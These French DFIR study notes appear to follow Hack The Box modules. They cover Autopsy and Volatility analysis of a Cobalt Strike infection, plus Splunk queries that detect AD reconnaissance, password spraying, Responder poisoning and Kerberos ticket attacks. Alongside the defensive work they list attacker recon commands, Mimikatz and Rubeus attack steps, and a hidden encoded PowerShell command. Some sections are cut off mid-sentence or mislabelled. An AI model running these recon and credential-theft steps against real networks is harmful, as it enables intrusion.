* **Analyse des Artefacts Web** : Permet l’analyse des données liées à la navigation web, comme l'historique de navigation et les fichiers mis en cache, ce qui est crucial pour suivre les activités menant à un incident.
* **Récupération des Emails** : Extrait et affiche les données des emails à partir des images disque, ce qui est souvent précieux lors de l'enquête sur des menaces internes ou des attaques basées sur des communications.
* **Visionneuse d'Images** : Facilite l'affichage des images stockées sur le système, potentiellement utile pour des vérifications de politique ou pour identifier du contenu illégal.
* **Analyse des Métadonnées** : Fournit des informations sur les attributs des fichiers comme les dates de création, les heures de modification et les hachages. Ces détails aident à établir une chronologie et à les mettre en corrélation avec d'autres découvertes, comme les activités malveillantes.

---

### Autopsy : Vue d'Ensemble de l'Outil de Criminalistique

Autopsy est un outil de criminalistique numérique open-source qui repose sur le cadre Sleuth Kit. Il offre une interface conviviale avec des fonctionnalités étendues que l’on retrouve généralement dans les outils commerciaux, telles que :

* **Navigation des Sources de Données** : Permet d'explorer directement les fichiers et répertoires au sein de l'image disque.
* **Examen des Artefacts Web** : Extrait des artefacts de navigation web, comme l'historique, les favoris et les fichiers mis en cache.
* **Analyse des Périphériques Connectés** : Identifie et analyse les périphériques externes connectés au système.
* **Récupération des Fichiers Supprimés** : Récupère les fichiers supprimés en scannant les secteurs du disque à la recherche de données résiduelles.
* **Recherches par Mots-clés** : Permet d'effectuer des recherches approfondies sur le contenu du disque à la recherche de mots-clés spécifiques.
* **Listes de Mots-clés** : Permet de rechercher de manière ciblée en utilisant des listes de mots-clés prédéfinies (par exemple, noms, IPs, indicateurs de compromission).
* **Analyse de la Chronologie** : Cartographie les événements chronologiquement, facilitant ainsi la construction d’une chronologie précise pour l’enquête.

---

### Utilisation Pratique d'Autopsy dans l'Analyse Forensique

Une fois l’image disque chargée dans Autopsy, les artefacts forensiques sont organisés dans la barre latérale, permettant un accès efficace à :

* **Sources de Données** : Vue de tous les fichiers et répertoires.
* **Artefacts Web** : Vue ciblée sur l’historique de navigation et les données associées.
* **Informations sur les Périphériques** : Détails sur les périphériques externes connectés.
* **Fichiers Supprimés** : Fichiers récupérés et fragments marqués comme supprimés.
* **Recherches par Mots-clés & Listes** : Capacités de recherche approfondie.
* **Analyse de la Chronologie** : Affichage organisé et chronologique des événements système, essentiel pour comprendre la séquence des actions menant à un incident.

---

Pour plus d'informations, consultez [Autopsy - Hack the Box Academy](https://academy.hackthebox.com/module/237/section/2611).

```

## **Rapid Triage Examination & Analysis Tools**

```jsx
### Téléchargement et Installation

````
Utilisez le lien .net 4 ou .net 6 sur le site pour les téléchargements.
Alternativement, utilisez PowerShell :

```powershell
PS C:\Users\johndoe\Desktop\Get-ZimmermanTools> .\Get-ZimmermanTools.ps1
```

Cela télécharge tous les outils dans `C:\htb\dfir_module\tools`.
L'outil suit les mises à jour par le biais de SHA-1 pour faciliter les mises à jour.
````

### Les Temps MAC(b) sur NTFS

Les temps MAC(b) suivent les événements du système de fichiers :

* **Temps Modifié (M)** : Dernière modification du contenu.
* **Temps Accédé (A)** : Dernier accès au fichier.
* **Temps Changé (C)** : Modifications de la MFT.
* **Temps de Création (b)** : Heure de création originale du fichier.

#### Exemple de Commandes

**Utilisation de MFTECmd pour Inspecter les Fichiers \$MFT** :

```powershell
PS C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6> .\MFTECmd.exe -f 'C:\Users\johndoe\Desktop\forensic_data\kape_output\D\$MFT' --de 0x16169
```

### Aperçu des Outils d'Investigation

#### Structure du Fichier MFT

La **Master File Table (MFT)** est essentielle pour suivre les fichiers sur un volume NTFS.
Les attributs du MFT comprennent **\$STANDARD\_INFORMATION** et **\$FILE\_NAME**.

#### Journaux des Événements Windows

**EvtxECmd** pour analyser les journaux **EVTX** en CSV ou JSON :

```powershell
PS C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6\EvtxeCmd> .\EvtxECmd.exe -f "chemin\vers\log.evtx" --csv "chemin_sortie"
```

Vous pouvez utiliser **Event Query Language (EQL)** pour interroger des journaux au format JSON.

#### Analyse du Registre Windows

**RegRipper** extrait des données spécifiques via des plugins :

```powershell
PS C:\Users\johndoe\Desktop\RegRipper3.0-master> .\rip.exe -r "C:\chemin\vers\hive" -p plugin_name
```

**Registry Explorer** fournit un accès graphique au registre.

#### Artefacts d'Exécution de Programme

**Analyse Prefetch avec PECmd** :

```powershell
PS C:\Users\johndoe\Desktop\Get-ZimmermanTools\net6> .\PECmd.exe -f C:\chemin\vers\fichier_prefetch.pf
```

**ShimCache** et **Amcache** : Accédez à ces artefacts via Registry Explorer pour l'historique des programmes.

### Analyse Avancée

* **Transcriptions PowerShell** : Examinez les commandes PowerShell inhabituelles.
* **Surveillance des API** : Les appels comme `getenv`, `CreateProcessA` et `RegOpenKeyExA` montrent des détails d'interaction.

### Commandes Clés pour l'Analyse Forensique

#### Commandes PowerShell

Examinez les commandes réseau, les commandes encodées et les modules inhabituels.

#### Autres Scripts et Commandes Importants

**Création du format JSON EQL** :

```powershell
PS C:\Users\eqllib-master\utils> Get-WinEvent -Path "log_path" -Oldest | Get-EventProps | ConvertTo-Json
```

```

## **Practical Digital Forensics Scenario**

```jsx

#### Accès au système cible

* **Accès via RDP** : Connectez-vous à l'IP cible avec les identifiants fournis.

#### Emplacements des preuves

* **Vidage mémoire** : `C:\Users\johndoe\Desktop\memdump\PhysicalMemory.raw`
* **Artifacts de triage rapide** :

  * `C:\Users\johndoe\Desktop\kapefiles`
  * `C:\Users\johndoe\Desktop\files`
* **Image disque complète** : `C:\Users\johndoe\Desktop\fulldisk.raw.001`
* **Données de disque analysées** : `C:\Users\johndoe\Desktop\MalwareAttack`

#### Notes

* **Analyse avec Autopsy** : Réaliser l'analyse dans le dossier `C:\Users\johndoe\Desktop\MalwareAttack`.
* **Environnement idéal pour la criminalistique** : L'analyse se fait directement sur le système compromis pour des raisons de rapidité, bien qu'il soit recommandé d'utiliser un environnement séparé.

---

### Analyse mémoire avec Volatility v3

#### Identification du profil mémoire

Pour obtenir les détails du système d'exploitation et du noyau à partir du vidage mémoire :

```bash
python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.info
```

**Exemple de sortie** :

```
Variable           | Valeur
-------------------|------------------------------------------------
Kernel Base        | 0xf80150019000
DTB                | 0x1ad000
Symbols            | file:///C:/Users/johndoe/Desktop/...
Is64Bit            | True
SystemTime         | 2023-08-10 09:35:40
NtSystemRoot       | C:\Windows
NtMajorVersion     | 10
NtMinorVersion     | 0
```

#### Détection de code injecté

Pour trouver les régions mémoire des processus contenant potentiellement du code injecté :

```bash
python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.malfind
```

**Exemple de sortie** :

```
Processes with PAGE_EXECUTE_READWRITE memory:
    PID 3648 (rundll32.exe), PID 6744 (powershell.exe), PID 5468 (rundll32.exe)
```

**Explication de PAGE\_EXECUTE\_READWRITE** :

* Ce type de permission permet à la fois l'exécution et la modification du code en mémoire, ce qui est rarement utilisé par des applications légitimes, mais couramment observé dans des malwares.

#### Identification des processus en cours

Lister les processus en cours :

```bash
python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.pslist
```

**Exemple de sortie** :

```
PID   PPID   ImageFileName   CreateTime                    SessionId
4     0      System          2023-08-10 00:22:53.000000   N/A
3648  7148   rundll32.exe     2023-08-10 09:15:14.000000   1
6744  908    powershell.exe   2023-08-10 09:21:16.000000   1
5468  7512   rundll32.exe     2023-08-10 09:23:15.000000   0
```

#### Visualisation de l'arbre des processus

Pour voir les relations parent-enfant des processus :

```bash
python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.pstree
```

Cela permet d'identifier les processus enfants suspects lancés par des processus légitimes comme `rundll32.exe` sous `explorer.exe`.

#### Identification des lignes de commande des processus

Pour récupérer les arguments de ligne de commande des processus :

```bash
python vol.py -q -f ..\memdump\PhysicalMemory.raw windows.cmdline
```

**Exemple de sortie** :

```
PID   Process        Args
416   csrss.exe      %SystemRoot%\system32\csrss.exe ObjectDirectory=\Windows ...
3648  rundll32.exe   C:\Windows\System32\rundll32.exe payload.dll,StartW
6744  powershell.exe PowerShell.exe -nop -w hidden -encodedcommand JABzAD0ATgBlAHcAL...
```

---

### Extraction de la mémoire du processus et utilisation de YARA

Pour analyser le processus avec PID 3648, utilisez le plugin `windows.memmap` pour extraire toutes les pages mémoire résidentes de ce processus :

```bash
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.memmap --pid 3648 --dump
```

**Sortie** :

```
0xf8016d0e9000  0x2077d000      0x3000  0x1bde4000      pid.3648.dmp
... (continues with memory pages)
```

L'image mémoire `pid.3648.dmp` sera stockée dans le répertoire `C:\Users\johndoe\Desktop`.

#### Analyse avec YARA

Pour scanner le vidage mémoire avec les règles YARA :

```powershell
$rules = Get-ChildItem C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules | Select-Object -Property Name
foreach ($rule in $rules) {C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\yara64.exe C:\Users\johndoe\Desktop\yara-4.3.2-2150-win64\rules\$($rule.Name) C:\Users\johndoe\Desktop\pid.3648.dmp}
```

**Sortie de YARA** :

```
HKTL_CobaltStrike_Beacon_Strings
CobaltStrike_Sleep_Decoder_Indicator
WiltedTulip_ReflectiveLoader
```

---

### Identification des DLLs chargées

Examinez les DLLs chargées avec le plugin `windows.dlllist` :

```bash
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.dlllist --pid 3648
```

**Sortie** :

```
payload.dll at E:\payload.dll, suggesting possible external or ISO origin.
```

#### Identification des poignées de fichiers

Utilisez `windows.handles` pour afficher les fichiers et les entrées de registre accédées :

```bash
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.handles --pid 3648
```

**Exemple de sortie** :

```
Access to \Device\HarddiskVolume3\Users\johndoe\Desktop
```

---

### Analyse des artefacts réseau

Pour analyser les connexions réseau avec `windows.netstat` :

```bash
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.netstat
```

**Exemple de sortie** :

```
chrome.exe, WWAHost.exe, rundll32.exe
```

Utilisez `windows.netscan` pour une analyse réseau plus approfondie :

```bash
python vol.py -q -f ../memdump/PhysicalMemory.raw windows.netscan
```

**Exemple de sortie** :

```
Le processus suspect (PID 3648) communique avec 44.214.212.249 via le port 80.
```

---

### Analyse des données de l'image disque et triage rapide

#### Recherche de mots-clés avec Autopsy

1. **Ouvrir Autopsy** et accéder au dossier `C:\Users\johndoe\Desktop\MalwareAttack`.
2. **Rechercher** `payload.dll` et prioriser par date de création.
3. **Extraction** : Faites un clic droit sur `Finance08062023.iso` dans le dossier Downloads et sélectionnez **Extraire le(s) fichier(s)**.

#### Identification des informations de téléchargement Web

La présence de `.Zone.Identifier` via un flux de données alternatif (ADS) confirme que le fichier provient d'Internet.

L'URL source identifiée dans les artefacts Web est : `letsgohunt[.]site`.

---

### Analyse de la configuration du Beacon Cobalt Strike

1. Utilisez **CobaltStrikeParser** pour analyser la configuration du beacon avec le fichier `payload.dll` :

```bash
python parse_beacon_config.py E:\payload.dll
```

**Configurations clés extraites** :

```
BeaconType: HTTP, Port: 80, C2Server: letsgohunt.site,/load
Autres champs notables : HttpGet_Metadata, bUsesCookies, Spawnto_x64.
```

---

### Mécanismes de persistance avec Autoruns

Analysez les entrées dans `C:\Users\johndoe\Desktop\files\johndoe_autoruns.arn` :

Une entrée trouvée :

```
Path: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Image: C:\ProgramData\svchost.exe
```

---

### Identification des hachages de fichiers et VirusTotal

Pour identifier le hachage de `photo433.exe` :

```powershell
PS C:\Users\johndoe> Get-FileHash -Algorithm SHA256 "C:\Users\johndoe\Desktop\kapefiles\auto\C%3A\Users\johndoe\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\photo443.exe"
```

---

### Analyse des tâches planifiées et du timestomping

Les incohérences entre les horodatages du MFT et les horodatages de fichier indiquent un possible **timestomping**.

#### Analyse des données SRUM

Exfiltration possible de 430526981 octets à partir de \`

```

## **Detecting Windows Attacks with Splunk**

## **Detecting Common User & Domain Recon**

```jsx

---

## Vue d’ensemble de la reconnaissance de domaine

### Concepts clés

* **Reconnaissance du domaine Active Directory (AD)** : Étape cruciale du cycle d’attaque durant laquelle l’attaquant collecte des informations sur l’environnement AD. Il cherche à identifier :

  * L’architecture, la topologie réseau et les mécanismes de sécurité.
  * Les actifs clés : contrôleurs de domaine, comptes utilisateurs, groupes, relations de confiance, unités organisationnelles (OU) et stratégies de groupe (GPO).

* **Objectif** : Identifier des cibles de grande valeur, élever ses privilèges et permettre des mouvements latéraux.

---

### Techniques de reconnaissance avec les commandes Windows natives

Les attaquants peuvent exécuter des commandes comme `net group` pour obtenir la liste des administrateurs du domaine. Parmi les commandes souvent utilisées :

* `whoami /all`
* `wmic computersystem get domain`
* `net user /domain`
* `net group "Domain Admins" /domain`
* `arp -a`
* `nltest /domain_trusts`

**Détection** : Surveillez l'exécution de commandes via PowerShell ou l'invite de commandes pour repérer une activité inhabituelle.

---

## Reconnaissance avec BloodHound / SharpHound

* **BloodHound** : Outil open source permettant de visualiser les relations, permissions et chemins d’attaque potentiels dans Active Directory.
* **SharpHound** : Collecteur de données (en C#) utilisé par BloodHound, souvent lancé avec l’option `-c all` pour un balayage complet.

### Méthodes de détection de BloodHound

* **Requêtes LDAP** : Les collecteurs BloodHound effectuent de nombreuses requêtes LDAP sur les contrôleurs de domaine.
* **Techniques de surveillance** :

  * **Événement 1644** : Surveillance des performances LDAP (limité en visibilité).
  * **ETW (Event Tracing for Windows)** via **Microsoft-Windows-LDAP-Client** : Utilisable avec **SilkETW** et **SilkService**, compatible avec les règles Yara.
  * **Filtres LDAP prédéfinis** : Utilisez ceux recommandés par l’équipe ATP de Microsoft pour détecter les requêtes LDAP typiques liées à la reconnaissance.

---

## Détection de reconnaissance utilisateur/domaine avec Splunk

### Objectif

Détecter les activités de reconnaissance typiques dans un intervalle de temps donné, en filtrant le bruit pour se concentrer sur les événements suspects.

---

### Détection via les exécutables Windows natifs

**Plage temporelle** : `earliest=1690447949` à `latest=1690450687`

```spl
index=main source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventID=1 earliest=1690447949 latest=1690450687
| search process_name IN (arp.exe,chcp.com,ipconfig.exe,net.exe,net1.exe,nltest.exe,ping.exe,systeminfo.exe,whoami.exe) 
  OR (process_name IN (cmd.exe,powershell.exe) AND process IN (*arp*,*chcp*,*ipconfig*,*net*,*net1*,*nltest*,*ping*,*systeminfo*,*whoami*))
| stats values(process) as process, min(_time) as _time by parent_process, parent_process_id, dest, user
| where mvcount(process) > 3
```

#### Explication

1. **Filtrage par index et source** : Recherche les événements Sysmon (création de processus - EventID=1) sur la période spécifiée.
2. **Processus ciblés** : Se concentre sur les exécutables liés à des commandes de reconnaissance.
3. **Agrégation statistique** : Regroupe par processus parent, utilisateur, destination, et liste les processus exécutés.
4. **Filtrage avancé** : Ne conserve que les événements où plus de 3 commandes de reconnaissance ont été exécutées par le même processus parent.

---

### Détection de reconnaissance via BloodHound

**Plage temporelle** : `earliest=1690195896` à `latest=1690285475`

```spl
index=main earliest=1690195896 latest=1690285475 source="WinEventLog:SilkService-Log"
| spath input=Message 
| rename XmlEventData.* as * 
| table _time, ComputerName, ProcessName, ProcessId, DistinguishedName, SearchFilter
| sort 0 _time
| search SearchFilter="*(samAccountType=805306368)*"
| stats min(_time) as _time, max(_time) as maxTime, count, values(SearchFilter) as SearchFilter by ComputerName, ProcessName, ProcessId
| where count > 10
| convert ctime(maxTime)
```

#### Explication

1. **Filtrage par index et source** : Recherche dans les logs SilkService pendant la période définie.
2. **Extraction des champs XML** : Utilisation de `spath` pour extraire les données structurées du message.
3. **Organisation des résultats** : Affiche les champs clés : nom de l’ordinateur, nom du processus, ID du processus, filtres LDAP.
4. **Filtrage par filtre LDAP spécifique** : Recherche les filtres contenant `samAccountType=805306368`, utilisé par BloodHound pour identifier les comptes utilisateurs.
5. **Agrégation et filtrage par fréquence** : Signale les processus qui effectuent plus de 10 requêtes LDAP de ce type.
6. **Conversion de l’horodatage** : Affiche la date et l’heure du dernier événement au format lisible.

---

```

## D**etecting Password Spraying**

```jsx

---

## Aperçu de l'attaque **Password Spraying**

**Password Spraying** est une attaque ciblée qui :

* Tente un nombre limité de mots de passe courants sur plusieurs comptes d'utilisateurs.
* Évite les politiques de verrouillage de compte en utilisant seulement quelques tentatives de mot de passe par compte.
* Est conçue pour échapper à la détection en exploitant des mots de passe faibles à travers un large éventail d'utilisateurs, plutôt que de brute-forcer des comptes individuels.

**Exemple** : Un attaquant utilise l'outil **Spray** pour tester un ensemble limité de mots de passe sur plusieurs comptes dans un réseau.

---

## Opportunités de détection

### Indicateurs basés sur les journaux pour détecter le **Password Spraying**

Surveiller les journaux Windows pour des motifs de **Password Spraying** peut permettre de détecter des anomalies, surtout lorsque plusieurs tentatives de connexion échouées (Event ID 4625) provenant de différents comptes utilisateurs sont effectuées depuis une seule adresse IP sur une courte période.

**Principaux événements à surveiller pour la détection du Password Spraying** :

1. **4625** - Connexion échouée

   * Suivi des échecs de connexion pour différents comptes provenant d'une seule source.
2. **4768** - Demande de ticket Kerberos (TGT)

   * ErrorCode 0x6 : Tentatives d'utilisateur invalide.
   * ErrorCode 0x12 : Tentatives d'utilisateur désactivé.
3. **4776** - Authentification NTLM

   * ErrorCode 0xC000006A : Utilisateurs NTLM invalides.
   * ErrorCode 0xC0000064 : Mauvais mot de passe NTLM.
4. **4648** - Tentative de connexion avec des identifiants explicites

   * Identifie les abus de credentials.
5. **4771** - Échec de pré-authentification Kerberos

---

## Détection du **Password Spraying** avec Splunk

### Plage horaire

* **Earliest** : `1690280680`
* **Latest** : `1690289489`

### Requête Splunk

```spl
index=main earliest=1690280680 latest=1690289489 source="WinEventLog:Security" EventCode=4625
| bin span=15m _time
| stats values(user) as Users, dc(user) as dc_user by src, Source_Network_Address, dest, EventCode, Failure_Reason
```

### Explication des composants de la requête

1. **Filtrage par Index, Source et Code d'Événement** :

   * Cette partie de la requête se concentre sur les événements du journal de sécurité (`WinEventLog:Security`) avec **EventCode=4625**, représentant les échecs de connexion.

2. **Filtre de plage horaire** :

   * La recherche est limitée à une plage horaire spécifique, définie par les horodatages Unix, afin de filtrer uniquement les journaux pertinents.

3. **Binning du temps** :

   * La commande `bin` regroupe les événements par intervalles de 15 minutes, ce qui aide à détecter les motifs en observant les tentatives de connexion échouées sur des périodes courtes.

4. **Agrégation des statistiques** :

   * La commande `stats` agrège les événements par champs clés pour analyser les échecs de connexion sur différents comptes.

     * **`values(user) as Users`** : Liste tous les utilisateurs uniques associés aux tentatives de connexion échouées.
     * **`dc(user) as dc_user`** : Compte le nombre d'utilisateurs distincts dans chaque groupe pour identifier plusieurs comptes ciblés depuis une seule adresse IP.

---

```

## **Detecting Responder-like Attacks**

```jsx
### **Vue d'ensemble du Poisoning LLMNR/NBT-NS/mDNS**

**LLMNR (Link-Local Multicast Name Resolution)**, **NBT-NS (NetBIOS Name Service)** et **mDNS (Multicast DNS)** sont des protocoles de résolution de noms utilisés lorsque DNS échoue. Ces protocoles sont vulnérables aux attaques de **spoofing** et de **poisoning**, souvent réalisées avec des outils comme **Responder**. L'attaquant répond aux requêtes de noms non résolus, capturant ainsi le **NetNTLM hash** de la victime, ce qui peut permettre des compromis supplémentaires des systèmes.

---

### **Opportunités de détection des attaques de type Responder**

1. **Surveiller le trafic LLMNR et NBT-NS** pour des comportements anormaux (par exemple, un grand nombre de requêtes).
2. Utiliser des **techniques de type honeypot** pour détecter des réponses réussies pour des hôtes inexistants.
3. Utiliser des **scripts PowerShell** pour détecter les réponses inattendues LLMNR ou NBT-NS.

#### **Exemple de script PowerShell pour la détection** :

```powershell
New-EventLog -LogName Application -Source LLMNRDetection
Write-EventLog -LogName Application -Source LLMNRDetection -EventId 19001 -Message $msg -EntryType Warning
```

---

### **Détection des attaques de type Responder avec Splunk**

#### **Plage horaire** :

* **Le plus tôt** : `1690290078`
* **Le plus tard** : `1690291207`

#### **Requêtes Splunk**

1. **Détection des alertes LLMNR** :

```spl
index=main earliest=1690290078 latest=1690291207 SourceName=LLMNRDetection
| table _time, ComputerName, SourceName, Message
```

2. **Suivi des requêtes DNS (Sysmon Event ID 22)** :

```spl
index=main earliest=1690290078 latest=1690291207 EventCode=22 
| table _time, Computer, user, Image, QueryName, QueryResults
```

3. **Event ID 4648 - Connexions explicites vers des partages malveillants** :

```spl
index=main earliest=1690290814 latest=1690291207 EventCode IN (4648) 
| table _time, EventCode, source, name, user, Target_Server_Name, Message
| sort 0 _time
```

Ces requêtes aident à suivre les activités suspectes liées aux requêtes LLMNR, NBT-NS et DNS, permettant ainsi une détection précoce des attaques de poisoning et des tentatives de vol de crédentiels.

```

## **Detecting Kerberoasting & AS-REProasting**

```jsx

---

## 🔎 **E. Détection de Golden Ticket via Splunk**

Cette requête Splunk permet de détecter une activité suspecte liée à des **Golden Tickets**, en identifiant les demandes de tickets de service (TGS) qui ne sont pas précédées par les étapes classiques d’authentification Kerberos (`AS-REQ` / `AS-REP`). Ce type de comportement peut indiquer l’utilisation d’un **TGT forgé** par un attaquant.

---

### ✅ **Requête Splunk**

```spl
index="golden_ticket_attack" sourcetype="bro:kerberos:json"
| where client!="-"
| bin _time span=1m
| stats count as total_requests, values(client), values(request_type) as request_types, dc(request_type) as unique_request_types by _time, id.orig_h, id.resp_h
| where total_requests > 10 AND unique_request_types==1 AND mvcount(request_types)==1 AND mvindex(request_types,0)=="TGS"
```

---

### 🧠 **Explication de la requête**

1. **Sélection des données**

   * `index="golden_ticket_attack"` : Recherche dans l’index dédié à la détection des attaques Golden Ticket.
   * `sourcetype="bro:kerberos:json"` : Utilise les logs Kerberos fournis par Zeek/Bro au format JSON.

2. **Filtrage du client**

   * `where client!="-”` : Écarte les événements où le champ `client` est vide ou absent.

3. **Regroupement temporel**

   * `bin _time span=1m` : Regroupe les événements par minute pour détecter des rafales de requêtes suspectes.

4. **Agrégation**

   * `stats count as total_requests` : Nombre total de requêtes par groupe.
   * `values(request_type)` : Types de requêtes observés (ex. TGS, AS-REQ).
   * `dc(request_type)` : Nombre de types distincts de requêtes.
   * `id.orig_h / id.resp_h` : IP source (client) et IP destination (souvent le contrôleur de domaine).

5. **Filtrage comportemental**

   * `total_requests > 10` : Se concentre sur les clients envoyant beaucoup de requêtes dans un court laps de temps.
   * `unique_request_types == 1` et `request_types == "TGS"` : Signale les cas où seule la demande de TGS est présente, sans trace d’AS-REQ/AS-REP.

---

### 🕵️ **Interprétation**

* Un client qui envoie uniquement des requêtes de type `TGS` sans aucune authentification préalable est **hautement suspect**. Cela peut signifier que l’attaquant a injecté un **Golden Ticket**, lui permettant d’accéder directement aux services sans s’authentifier auprès du KDC.

---

### 📌 **À investiguer**

* **Adresse IP source (`id.orig_h`)** : Est-ce une machine autorisée ?
* **Fréquence** : Ce comportement se répète-t-il dans plusieurs intervalles ?
* **IP destination (`id.resp_h`)** : Correspond-elle à un contrôleur de domaine ?
* **Client ou utilisateur** : S’agit-il d’un service connu ou d’un compte anormal ?

---

```

## **Detecting Pass-the-Hash**

```jsx

---

## Aperçu de l'attaque **Overpass-the-Hash (Pass-the-Key)**

**Overpass-the-Hash (Pass-the-Key)** permet aux attaquants de s'authentifier via Kerberos en utilisant des hashs de mots de passe volés, leur permettant ainsi de demander des TGT (Ticket Granting Ticket) Kerberos et d'obtenir un accès non autorisé aux systèmes sans avoir recours à NTLM.

### Étapes de l'attaque

1. **Extraction des hash des utilisateurs** : L'attaquant utilise des outils comme **Mimikatz** pour obtenir le hash NTLM d'un utilisateur connecté, nécessitant des privilèges d'administrateur local.
2. **Demande de TGT avec Rubeus** : L'attaquant utilise **Rubeus** pour créer une requête brute AS-REQ pour un TGT d'un utilisateur spécifié. Cette étape ne nécessite pas de privilèges élevés, la rendant plus discrète.
3. **Soumission du Ticket** : L'attaquant injecte le TGT demandé dans la session en cours, de manière similaire à l'attaque Pass-the-Ticket, pour effectuer des mouvements latéraux.

---

## Opportunités de détection de l'attaque **Overpass-the-Hash**

### Logique de détection clé

* **Détection de Mimikatz** : Les artefacts d'attaques Overpass-the-Hash basées sur Mimikatz ressemblent à ceux des attaques **Pass-the-Hash** et peuvent être détectés à l'aide de techniques similaires.
* **Détection de Rubeus** : Lorsque **Rubeus** envoie une requête AS-REQ directement au contrôleur de domaine via le port TCP/UDP 88, cela génère l'**Event ID 4768**. Cependant, des processus inhabituels communiquant sur le port 88 vers le contrôleur de domaine, autre que `lsass.exe`, peuvent aider à identifier l'activité potentielle d'Overpass-the-Hash.

---

## Exemple de requête Splunk : Détection de **Rubeus** dans l'attaque **Overpass-the-Hash**

**Description** : Cette requête identifie les requêtes AS-REQ envoyées sur le port 88 provenant de processus inhabituels, en recherchant spécifiquement l'**Event ID 3** avec un port de destination égal à 88, tout en excluant `lsass.exe`.

**Plage horaire** : `earliest=1690443407 latest=1690443544`

```spl
index=main earliest=1690443407 latest=1690443544 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" (EventCode=3 dest_port=88 Image!=*lsass.exe) OR EventCode=1
| eventstats values(process) as process by process_id
| where EventCode=3
| stats count by _time, Computer, dest_ip, dest_port, Image, process
| fields - count
```

---

### Explication des composants clés de la requête

1. **Filtrage des événements** :

   * **Sélection de la source** : Filtre les événements provenant du journal opérationnel de Sysmon (`XmlWinEventLog:Microsoft-Windows-Sysmon/Operational`).
   * **EventCode 3** : Capture les connexions réseau effectuées par l'hôte, ciblant spécifiquement le trafic vers `dest_port=88` (Kerberos), en excluant `Image=lsass.exe`, car il s'agit d'un processus légitime accédant aux services Kerberos.
   * **OR EventCode 1** : Capture tous les événements de création de processus pour permettre une corrélation avec d'autres événements liés aux processus suspects.

2. **Statistiques des événements** :

   * **EventStats** : Ajoute la liste des processus pour chaque identifiant de processus (`process_id`), stockée sous `process`.
   * **Where EventCode=3** : Filtre pour les événements de connexion réseau sur le port 88.

3. **Agrégation et filtrage** :

   * **Stats count by Fields** : Agrège les événements par `_time`, `Computer`, `dest_ip`, `dest_port`, `Image`, et `process`, tout en calculant le nombre d’occurrences (`count`).
   * **Fields - count** : Supprime le champ `count` du résultat final pour plus de clarté.

---

```

## **Detecting Pass-the-Ticket**

```jsx

---

## Aperçu de l'attaque **Pass-the-Ticket (PtT)**

**Pass-the-Ticket (PtT)** est une technique permettant aux attaquants de se déplacer latéralement dans un réseau en utilisant des tickets Kerberos au lieu de mots de passe. Avec des privilèges administratifs, un attaquant peut extraire des tickets Kerberos valides (TGT ou TGS) de la mémoire d'un système compromis et les utiliser pour accéder à des ressources sans avoir besoin du mot de passe de l'utilisateur.

### Étapes de l'attaque **Pass-the-Ticket** :

1. **Extraction des tickets Kerberos** : L'attaquant utilise des outils comme **Mimikatz** pour extraire des tickets TGT ou TGS d'un système compromis.
2. **Authentification avec le ticket extrait** : L'attaquant soumet le ticket dans la session de connexion en cours, s'authentifiant en tant qu'utilisateur sans avoir besoin du mot de passe.
3. **Mouvement latéral** : En utilisant le ticket, l'attaquant peut accéder à des systèmes ou ressources supplémentaires sur le réseau.

### Processus d'authentification Kerberos & événements de sécurité associés à Windows

* **Event ID 4624** : Connexion réussie à un système.
* **Event ID 4648** : Tentative de connexion explicite avec des informations d'identification.
* **Event ID 4672** : Connexion spéciale, indiquant des privilèges administratifs.
* **Event ID 4768** : Demande de TGT dans le processus Kerberos.
* **Event ID 4769** : Demande de TGS dans le processus Kerberos.
* **Event ID 4770** : Renouvellement de ticket TGS.

## Opportunités de détection de l'attaque **Pass-the-Ticket**

### Logique clé de détection

La détection des attaques **PtT** nécessite de surveiller les demandes de tickets de service Kerberos (TGS) émises sans une demande préalable de TGT. Les attaquants peuvent importer un TGT directement dans une session, créant ainsi un écart où une demande de TGS (Event ID 4769) ou un renouvellement de ticket (Event ID 4770) n'a pas de demande TGT associée (Event ID 4768). Surveiller les incohérences dans le processus d'authentification peut permettre de repérer les tentatives **PtT**.

---

### Exemple 1 : Détection des demandes de tickets TGS sans demande préalable de TGT

**Description** : Cette requête recherche les demandes de tickets de service Kerberos (4769) et les renouvellements (4770) sans demande préalable de TGT (4768) provenant du même système, ce qui peut indiquer un TGT importé.

**Plage horaire** : `earliest=1690392405 latest=1690451745`

```spl
index=main earliest=1690392405 latest=1690451745 source="WinEventLog:Security" user!=*$ EventCode IN (4768,4769,4770)
| rex field=user "(?<username>[^@]+)"
| rex field=src_ip "(\:\:ffff\:)?(?<src_ip_4>[0-9\.]+)"
| transaction username, src_ip_4 maxspan=10h keepevicted=true startswith=(EventCode=4768)
| where closed_txn=0
| search NOT user="*$@*"
| table _time, ComputerName, username, src_ip_4, service_name, category
```

### Explication des composants clés

1. **Filtrage des événements** :

   * **Sélection des événements** : Filtre les événements pour inclure uniquement les **Event IDs 4768**, **4769** et **4770** dans le journal de sécurité, en excluant les comptes machines (`user!=*$`).

2. **Expressions régulières** :

   * **Extraction du nom d'utilisateur** : Extrait le nom d'utilisateur du champ `user` pour une identification plus facile.
   * **Extraction de l'IP** : Extrait les adresses IPv4 de `src_ip`, en tenant compte des adresses IPv6 mappées sur IPv4 en se concentrant sur la portion IPv4.

3. **Commande `transaction`** :

   * **But** : Groupe les événements associés par `username` et `src_ip_4`, en commençant avec **EventCode 4768** (demande de TGT).
   * **Paramètres** : `maxspan=10h` définit une fenêtre de transaction maximale de 10 heures, permettant des sessions de connexion longues ; `keepevicted=true` garantit que les transactions ouvertes restent visibles.

4. **Filtrage pour transactions ouvertes** :

   * **closed\_txn=0** : Filtre les transactions sans événement de clôture, ce qui montre les cas où des tickets TGS ou des renouvellements ont été demandés sans une demande de TGT préalable.

5. **Affichage des résultats** :

